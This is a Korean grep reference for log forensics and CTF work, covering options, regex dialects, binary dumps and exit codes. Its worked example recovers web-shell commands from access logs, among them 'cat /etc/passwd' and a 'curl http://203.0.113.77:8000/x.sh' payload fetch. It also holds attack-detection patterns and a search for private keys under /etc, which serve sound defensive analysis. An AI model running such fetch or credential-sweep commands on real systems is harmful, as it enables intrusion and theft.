---
id: FOR-0112
title: "grep 기본 옵션 레퍼런스: -i -v -c -o -w -E -P -r 와 종료 코드"
slug: "grep-basics"
category: "로그/Regex"
type: "reference"
difficulty: "intermediate"
priority: "critical"
platform: [linux, windows]
artifact: ["access.log", "auth.log", "syslog", "text log", "memory strings"]
file_paths: ["/var/log/auth.log", "/var/log/syslog", "/var/log/apache2/access.log"]
registry_paths: []
event_ids: []
protocols: []
tools: ["grep", "egrep", "fgrep", "zgrep", "ripgrep"]
commands: ["grep -n 'Failed password' auth.log", "grep -c 'POST' access.log", "grep -o 'cmd=[^& ]*' access.log", "grep -rn --include='*.log' 'flag{' .", "grep -w 'root' auth.log", "grep -A2 -B2 'shell.php' access.log", "grep -aoP 'flag\\{[^}]+\\}' memdump.raw"]
regex_patterns: ["flag\\{[^}]+\\}", "cmd=[^& ]*", "^[0-9]{1,3}(\\.[0-9]{1,3}){3}"]
wireshark_filters: []
tshark_fields: []
log_fields: []
file_formats: ["log", "txt", "csv", "raw"]
primary_terms: ["grep", "grep 기본", "grep 옵션"]
keywords: ["grep", "grep 옵션", "BRE", "ERE", "PCRE", "grep -P", "grep -o", "grep -v", "grep -c", "grep -r", "--include", "종료 코드", "exit code", "binary file matches"]
aliases: ["grep 옵션", "grep 사용법", "grep 대소문자", "grep 제외", "grep 개수", "grep 재귀", "grep 바이너리"]
symptom_keywords: ["grep 옵션을 모르겠다", "Binary file matches 만 나온다", "grep -P 가 안 된다", "매칭된 부분만 보고 싶다", "특정 파일만 검색하고 싶다", "제외 검색을 하고 싶다"]
related: ["FOR-0113", "FOR-0114", "FOR-0121"]
source_ids: ["SRC-015", "SRC-055"]
last_verified: "2026-09-10"
status: "verified"
---

## 한 줄 결론

`grep`의 실전 조합은 `-n`(줄 번호), `-c`(개수), `-o`(매칭 부분만), `-v`(제외), `-i`(대소문자 무시), `-r --include`(재귀+파일 필터) 여섯 개에서 거의 끝나고, 기본 문법은 **BRE**이므로 `+` `?` `{}` `|`를 쓰려면 `-E`, lookaround가 필요하면 `-P`를 붙여야 한다.

## 개념

`grep`은 **줄 단위** 도구다. 패턴이 줄 안에 있으면 그 줄 전체를 출력한다. 이 한 문장이 모든 동작을 설명한다.

| 성질 | 결과 |
| --- | --- |
| 줄 단위 | 여러 줄에 걸친 패턴은 못 잡는다 (`-z` 예외) |
| 부분 일치 | `grep 'root'`은 `chroot`도 잡는다 (`-w`/`-x`로 좁힌다) |
| 출력은 줄 전체 | 값만 필요하면 `-o` |
| 기본 문법은 BRE | `+` `?` `{` `}` `\|` `(` `)`가 **리터럴** |

정규식 방언이 셋이며, 이것이 초보자가 가장 많이 막히는 지점이다.

| | BRE (기본) | ERE (`-E`) | PCRE (`-P`) |
| --- | --- | --- | --- |
| 그룹 | `\(...\)` | `(...)` | `(...)` |
| OR | `\\\|` (GNU 확장) | `\|` | `\|` |
| 1회 이상 | `\+` (GNU 확장) | `+` | `+` |
| 0 또는 1회 | `\?` (GNU 확장) | `?` | `?` |
| 반복 횟수 | `\{2,4\}` | `{2,4}` | `{2,4}` |
| `\w` `\s` `\b` | 된다 (GNU 확장) | 된다 (GNU 확장) | 된다 |
| `\d` `\D` | **안 된다** | **안 된다** | 된다 |
| 게으른 수량자 `*?` | 안 된다 | 안 된다 | 된다 |
| lookahead `(?=)` `(?!)` | 안 된다 | 안 된다 | 된다 |
| lookbehind `(?<=)` `(?<!)` | 안 된다 | 안 된다 | 된다 |
| 명명 캡처 `(?<n>)` | 안 된다 | 안 된다 | 된다 |
| 이식성 | 최고 | 높다 | **빌드에 따라 없을 수 있다** |

`-P`는 PCRE 라이브러리를 링크해 빌드한 `grep`에서만 동작한다. 없으면 `grep: -P supports only unibyte and UTF-8 locales` 또는 `grep: support for the -P option is not compiled into this --disable-perl-regexp binary` 같은 에러가 난다. 그럴 때는 `rg -P`로 넘어간다 ([FOR-0114](./ripgrep.html)).

`egrep`/`fgrep`은 각각 `grep -E`/`grep -F`와 같지만 **GNU grep에서 사용 시 deprecated 경고**가 나올 수 있으므로 `-E`/`-F`를 쓴다.

## 파일 / 경로

`grep`을 가장 많이 돌리는 대상이다.

| 대상 | 경로 | 자주 찾는 것 |
| --- | --- | --- |
| 웹 접근 로그 | `/var/log/apache2/access.log`, `/var/log/nginx/access.log` | `POST`, `cmd=`, `.php` |
| 인증 로그 | `/var/log/auth.log`, `/var/log/secure` | `Failed password`, `Accepted password`, `sudo:` |
| 시스템 로그 | `/var/log/syslog`, `/var/log/messages` | 서비스 태그 |
| 소스/설정 트리 | `.` (재귀) | `flag{`, 자격증명, 하드코딩 IP |
| 메모리 덤프 | `*.raw`, `*.mem` | `-a` 필요 |
| 압축 로그 | `*.gz` | `zgrep` 또는 `rg -z` |

## 주요 필드

옵션마다 **입력 한 줄과 매칭/비매칭**을 붙였다. 입력은 다음 3줄을 공통으로 쓴다.

```text
1: 203.0.113.77 - - [14/Mar/2026:07:11:02 +0900] "GET /admin/ HTTP/1.1" 403 199
2: 192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] "POST /upload.php HTTP/1.1" 200 87
3: Mar 14 07:11:02 web01 sshd[2841]: Failed password for root from 203.0.113.77
```

### 출력을 바꾸는 옵션

| 옵션 | 긴 이름 | 하는 일 |
| --- | --- | --- |
| `-n` | `--line-number` | 줄 번호를 앞에 붙인다 |
| `-c` | `--count` | 매칭된 **줄 수**만 출력 |
| `-o` | `--only-matching` | 매칭된 **부분만** 출력 (한 줄에 여러 개면 여러 줄로) |
| `-l` | `--files-with-matches` | 매칭이 있는 **파일 이름만** |
| `-L` | `--files-without-match` | 매칭이 **없는** 파일 이름만 |
| `-h` | `--no-filename` | 파일명 접두어 제거 (다중 파일에서도) |
| `-H` | `--with-filename` | 파일명 접두어 강제 (단일 파일에서도) |
| `-q` | `--quiet` | 아무것도 출력하지 않고 종료 코드만 |
| `-m N` | `--max-count=N` | 파일당 N건 찾으면 멈춘다 |

```bash
$ grep -n 'POST' access.log
2:192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] "POST /upload.php HTTP/1.1" 200 87

$ grep -c 'GET\|POST' access.log
2

$ grep -o 'POST /[^ ]*' access.log
POST /upload.php
```

| 항목 | 값 |
| --- | --- |
| `-o 'POST /[^ ]*'` 매칭됨 | 2번 줄에서 `POST /upload.php` |
| `-o` 매칭 안 됨 | 1번 줄(`GET`), 3번 줄(HTTP 요청 아님) |
| `-c` 주의 | 한 줄에 3개 매칭이 있어도 **1**로 센다. 총 개수는 `grep -o ... \| wc -l` |
| `-m 1` 주의 | "최초 1건"은 되지만 **파일당** 1건이다. 여러 파일에서는 파일마다 1건 |

### 매칭 범위를 바꾸는 옵션

| 옵션 | 긴 이름 | 하는 일 |
| --- | --- | --- |
| `-i` | `--ignore-case` | 대소문자 무시 |
| `-v` | `--invert-match` | 매칭되지 **않는** 줄 |
| `-w` | `--word-regexp` | 단어 경계에서만 (앞뒤가 `[A-Za-z0-9_]`가 아니어야 한다) |
| `-x` | `--line-regexp` | 줄 **전체**가 패턴과 일치해야 한다 |
| `-F` | `--fixed-strings` | 정규식이 아니라 **문자 그대로** |
| `-E` | `--extended-regexp` | ERE |
| `-P` | `--perl-regexp` | PCRE |
| `-e PAT` | `--regexp=PAT` | 패턴 여러 개 (OR). `-` 로 시작하는 패턴에도 필요 |
| `-f FILE` | `--file=FILE` | 파일에 든 패턴 목록(한 줄 하나)을 전부 OR |

`-w`와 `-x`의 차이를 예시로 굳혀 둔다. 입력이 `root`, `chroot`, `root:x:0:0`, `root ` 네 줄일 때다.

| 명령 | `root` | `chroot` | `root:x:0:0` | 이유 |
| --- | --- | --- | --- | --- |
| `grep 'root'` | 매칭 | **매칭** | 매칭 | 부분 일치 |
| `grep -w 'root'` | 매칭 | 매칭 안 됨 | 매칭 | `:`는 단어 문자가 아니므로 경계가 성립 |
| `grep -x 'root'` | 매칭 | 매칭 안 됨 | **매칭 안 됨** | 줄 전체가 정확히 `root`여야 한다 |

`-F`의 효과다.

| 명령 | `192.168.1.1` | `192a168b1c1` | 이유 |
| --- | --- | --- | --- |
| `grep '192.168.1.1'` | 매칭 | **매칭** | `.`이 임의의 한 문자 |
| `grep -F '192.168.1.1'` | 매칭 | 매칭 안 됨 | `.`이 리터럴 |

`-v`는 노이즈 제거의 주력이다.

```bash
# 헬스체크와 정적 리소스를 버린다
grep -v '/health' access.log | grep -Ev '\.(css|js|png|jpg|ico|woff2?)( |\?)'
```

### 문맥을 함께 보는 옵션

| 옵션 | 하는 일 |
| --- | --- |
| `-A N` | 매칭 줄 **뒤** N줄 함께 |
| `-B N` | 매칭 줄 **앞** N줄 함께 |
| `-C N` | 앞뒤 N줄 함께 (`-A N -B N`) |
| `--group-separator=S` | 블록 사이 구분자 지정 |
| `--no-group-separator` | 블록 구분자(`--`) 제거 — 파이프에 넘길 때 쓴다 |

```bash
$ grep -n -B1 -A2 'upload.php' access.log
1-203.0.113.77 - - [14/Mar/2026:07:11:02 +0900] "GET /admin/ HTTP/1.1" 403 199
2:192.168.10.24 - - [14/Mar/2026:07:11:09 +0900] "POST /upload.php HTTP/1.1" 200 87
```

매칭 줄은 `:`, 문맥 줄은 `-`로 구분된다. **파이프로 넘길 때 이 `-`가 섞이므로** 이후 `awk '{print $1}'` 같은 처리가 어긋난다. 문맥은 사람이 읽을 때만 쓴다.

### 재귀와 파일 선택

| 옵션 | 하는 일 |
| --- | --- |
| `-r` | `--recursive`. 디렉터리 재귀. **심볼릭 링크는 따라가지 않는다**(명령행 인자로 준 것은 예외) |
| `-R` | `--dereference-recursive`. 심볼릭 링크까지 따라간다 |
| `--include=GLOB` | 이 glob에 맞는 파일만 |
| `--exclude=GLOB` | 이 glob에 맞는 파일 제외 |
| `--exclude-dir=GLOB` | 디렉터리 제외 |
| `-s` | `--no-messages`. "그런 파일 없음"·권한 에러 숨김 |
| `-I` | 바이너리 파일 무시 (`--binary-files=without-match`) |

```bash
# 로그만 재귀 검색, 줄 번호와 파일명 함께
grep -rn --include='*.log' 'flag{' .

# 노이즈 디렉터리 제외
grep -rn --exclude-dir={.git,node_modules,dist} 'password' .

# 권한 에러를 숨기고 파일 목록만
grep -rls --include='*.conf' 'BEGIN RSA PRIVATE KEY' /etc
```

`-R`는 순환 심볼릭 링크에서 같은 파일을 반복 읽을 수 있으므로 증거물 트리에서는 `-r`를 기본으로 쓴다.

### 바이너리 데이터 처리

기본 동작은 **매칭 내용을 보여주지 않는 것**이다.

```bash
$ grep 'flag{' memdump.raw
Binary file memdump.raw matches
```

| 옵션 | 동작 |
| --- | --- |
| `-a` (`--text`) | 바이너리를 텍스트로 취급해 매칭 줄을 출력 |
| `--binary-files=text` | `-a`와 같다 |
| `--binary-files=without-match` | `-I`와 같다. 바이너리는 아예 건너뛴다 |
| `-z` (`--null-data`) | 입력을 **NUL(`\0`)로 구분된 레코드**로 본다 |

`-a`로 뽑을 때는 반드시 `-o`를 함께 쓴다. 그렇지 않으면 "한 줄"이 수 MB일 수 있어 터미널이 잠긴다.

```bash
# 메모리 덤프에서 flag 만 (줄 전체를 출력하지 않는다)
grep -aoP 'flag\{[^}]{1,200}\}' memdump.raw | sort -u
```

| 항목 | 값 |
| --- | --- |
| `-ao 'flag\{[^}]*\}'` 매칭됨 | `flag{c0re_dump_l3ak}` |
| 매칭 안 됨 | `FLAG{...}` (대문자, `-i` 필요), 널바이트로 쪼개진 `f\0l\0a\0g` (UTF-16LE) |

UTF-16LE 문자열은 `grep`으로 안 잡힌다. `strings -el` 로 먼저 뽑아 파이프한다.

```bash
strings -el memdump.raw | grep -o 'flag{[^}]*}'
```

`-z`는 **압축 해제가 아니다.** `find -print0` 같은 NUL 구분 스트림을 다룰 때 쓴다. 압축 로그는 `zgrep` 또는 `rg -z`다.

```bash
# 파일명에 공백이 있어도 안전
find . -name '*.log' -print0 | xargs -0 grep -n 'Failed password'
```

### 종료 코드

스크립트와 조건문에서 이 값을 쓴다.

| 코드 | 의미 |
| --- | --- |
| `0` | 한 건 이상 매칭됨 |
| `1` | 매칭 없음 (에러 아님) |
| `2` | 파일 없음·권한 없음·정규식 오류 등 실제 오류 |

`-q`와 조합하면 "있는지 없는지"만 빠르게 판정한다. `-q`는 첫 매칭에서 즉시 종료하므로 대용량에서 특히 빠르다.

```bash
if grep -q 'Accepted password' auth.log; then echo '성공 로그온 있음'; fi

# 파일 목록에서 패턴이 없는 것만 찾기 (-L)
grep -Lq 'PermitRootLogin' /etc/ssh/sshd_config
```

주의할 점이 두 개다.

- `grep -c PAT file`은 개수가 `0`이면 **종료 코드 1**을 반환한다. `set -e` 스크립트에서 중단된다.
- 파이프에서는 `$?`가 마지막 명령의 코드다. `grep ... | wc -l`의 종료 코드는 `wc`의 것이며 항상 0이다.

## 빠른 명령

```bash
grep -n 'Failed password' auth.log
```

실전 조합 모음이다.

```bash
# 1) 상위 IP — grep 으로 좁히고 필드로 센다
grep 'Failed password' auth.log | awk '{for(i=1;i<=NF;i++) if($i=="from") print $(i+1)}' |
  sort | uniq -c | sort -nr | head

# 2) 총 매칭 개수(줄 수가 아니라 실제 개수)
grep -o 'cmd=' access.log | wc -l

# 3) 여러 패턴 OR — 공격 유형 스캔
grep -nE 'union[[:space:]]+select|\.\./|cmd=|<script|/etc/passwd' access.log

# 4) 패턴 파일로 IOC 일괄 검색
printf '%s\n' 203.0.113.77 198.51.100.5 evil.example.com > ioc.txt
grep -nFf ioc.txt access.log

# 5) 공격 IP 의 요청 흐름만, 상태 코드 200 만
grep '^203\.0\.113\.77 ' access.log | awk '$9==200'

# 6) 노이즈 제거 후 URI 상위
grep -v '/health' access.log |
  grep -Ev '\.(css|js|png|jpg|ico|woff2?)( |\?)' |
  awk '{print $7}' | sort | uniq -c | sort -nr | head

# 7) 시간 구간만 (문자열 비교로 충분하다)
grep '14/Mar/2026:07:1[0-9]:' access.log

# 8) 압축된 로테이션 로그까지 전부
zgrep -h 'POST /upload' access.log.*.gz | wc -l

# 9) 재귀 + 파일 필터 + 줄 번호 (CTF 첨부 폴더 전체 훑기)
grep -rniI --include='*.txt' --include='*.log' --include='*.json' 'flag' . | head -50

# 10) 매칭이 없는 파일 찾기 (설정 누락 점검)
grep -rL 'Authentication' ./configs
```

PowerShell 환경에서는 `Select-String`이 같은 역할을 한다. 옵션 대응은 [FOR-0121](./powershell-select-string.html)에 있다.

## 함께 보는 artifact

| grep으로 얻은 것 | 다음 목표 |
| --- | --- |
| 매칭 줄 번호 | `sed -n 'N,Mp'`로 그 구간 전체를 본다 ([FOR-0118](./head-tail-less.html)) |
| 매칭 IP | 필드 완전 일치로 재집계 ([FOR-0115](./awk-fields.html)) |
| 빈도 순위 | `sort \| uniq -c \| sort -nr` ([FOR-0117](./sort-uniq.html)) |
| `-P`가 없다 | `rg -P` ([FOR-0114](./ripgrep.html)) |
| ERE 문법이 필요하다 | `grep -E` 실전 ([FOR-0113](./grep-e-regex.html)) |
| 메모리 덤프의 문자열 | `strings -el` + `grep` |
| 로그 형식을 모른다 | 형식 판별 ([FOR-0111](./log-triage.html)) |

## 흔한 실수

- **BRE에서 `+`·`?`·`{}`·`|`를 그냥 쓰는 것.** `grep 'a+'`는 문자 `a+`를 찾는다. ERE가 필요하면 `-E`를 붙이거나 BRE에서 `\+`로 이스케이프한다.
- **`-c`를 "매칭 개수"로 착각하는 것.** `-c`는 **줄 수**다. 한 줄에 IP가 3개 있으면 1로 센다. 실제 개수는 `grep -o ... | wc -l`.
- **`-o` 없이 바이너리에 `-a`를 쓰는 것.** 덤프 전체가 한 줄로 취급되어 수 MB가 쏟아진다. `-a`는 항상 `-o`와 함께.
- **`Binary file ... matches`를 "못 찾았다"로 읽는 것.** 찾은 것이다. 내용을 보려면 `-a`를 붙인다.
- **`-P`가 항상 있다고 가정하는 것.** 배포판 빌드에 따라 없다. lookaround가 필요하면 `rg -P`나 Python으로 옮기는 편이 안전하다.
- **`-z`를 압축 옵션으로 아는 것.** `-z`는 NUL 구분 입력용이다. 압축은 `zgrep` 또는 `rg -z`.
- **`grep -r`의 결과를 그대로 파이프에 넣는 것.** 출력이 `파일명:줄내용`이므로 `awk '{print $1}'`이 파일명을 집는다. `-h`로 접두어를 없애거나 `-o`로 값만 뽑는다.
- **`-A`/`-B` 결과를 집계에 쓰는 것.** 문맥 줄은 `-`로, 매칭 줄은 `:`로 붙고 블록 사이에 `--`가 들어간다. 집계 전에 문맥을 끈다.
- **`-i`를 습관적으로 붙이는 것.** flag 문자열이나 Base64는 대소문자가 의미를 가진다. `-i`가 오탐을 부른다.
- **`grep 'root'`로 계정을 세는 것.** `chroot`·`rootkit`도 걸린다. 단어라면 `-w`, 필드라면 `awk`의 완전 일치를 쓴다.
- **셸 확장을 잊는 것.** 패턴은 항상 **작은따옴표**로 감싼다. 큰따옴표 안의 `$`·`` ` ``·`\`가 셸에 먹힌다.
- **`--include`를 `-r` 없이 쓰는 것.** `--include`는 재귀 검색의 파일 필터다. 단일 파일 인자에는 영향이 없다.

## mini example

```text
문제:
"압축 포함 로테이션된 웹 로그 전체에서 웹셸에 전달된 명령 문자열을 모두 나열하세요."
첨부: access.log, access.log.1, access.log.2.gz, access.log.3.gz

1. 첫 시도 (실패):
   $ grep -o 'cmd=.*' access.log*
   access.log:cmd=id HTTP/1.1" 200 42
   access.log:cmd=whoami HTTP/1.1" 200 38
   ...
   -> .* 가 욕심쟁이라 줄 끝까지 삼켰다. 명령만이 아니라 프로토콜·상태코드까지 붙었다.
      게다가 .gz 파일은 "Binary file access.log.2.gz matches" 로만 나왔다.

2. 두 번째 시도 (또 실패):
   $ grep -o 'cmd=[^ ]*' access.log*
   access.log:cmd=cat+/etc/passwd
   ...
   -> 값은 깔끔해졌지만 여전히 .gz 는 못 읽는다.
      -a 를 붙이면 압축 바이너리를 그대로 읽어 쓰레기가 나온다. -a 는 답이 아니다.

3. 접근 변경 — 압축은 zgrep 이 푼다
   $ zgrep -ho 'cmd=[^& ]*' access.log access.log.1 access.log.2.gz access.log.3.gz |
       sort | uniq -c | sort -nr
        41 cmd=id
        33 cmd=whoami
        12 cmd=cat+/etc/passwd
         9 cmd=ls+-la+/var/www
         2 cmd=curl+http://203.0.113.77:8000/x.sh
   -> zgrep 은 비압축 파일도 그대로 처리한다. -h 로 파일명 접두어를 없애 집계가 깨지지 않게 한다.

4. URL 인코딩 풀기 — + 는 공백, %2F 는 /
   $ zgrep -ho 'cmd=[^& ]*' access.log* | sed 's/^cmd=//; s/+/ /g' | sort -u
   cat /etc/passwd
   curl http://203.0.113.77:8000/x.sh
   id
   ls -la /var/www
   whoami

5. 교차검증 — 개수를 두 방법으로
   $ zgrep -c 'cmd=' access.log*        # 파일별 "줄 수"
   access.log:74
   access.log.1:19
   access.log.2.gz:3
   access.log.3.gz:1
   $ zgrep -ho 'cmd=' access.log* | wc -l
   97
   -> 74+19+3+1 = 97. 일치. 한 줄에 cmd= 가 두 번 나온 경우가 없다는 뜻이다.

정답: id, whoami, cat /etc/passwd, ls -la /var/www, curl http://203.0.113.77:8000/x.sh
```

1·2단계의 교훈이 두 개다. **`-o`에는 `.*` 대신 `[^구분자]*`를 쓴다**, 그리고 **압축 파일에 `-a`를 붙이지 말고 `zgrep`으로 넘긴다.**

## 출처

- SRC-015 — GNU grep manual: 전체 옵션 정의, BRE/ERE/PCRE 지원 범위, 종료 코드 0/1/2, `--binary-files` 동작, `-r`와 `-R`의 심볼릭 링크 차이
- SRC-055 — ripgrep User Guide: `-P`(PCRE2) 대안 및 `grep`과의 기본 동작 차이 비교용
- `-P` 사용 가능 여부와 에러 메시지 문구는 배포판 빌드 옵션에 따라 다르므로 실제 환경에서 `grep -P '' /dev/null`로 확인할 것
- `egrep`/`fgrep`의 deprecated 경고 출력 여부는 grep 버전에 따라 다르다
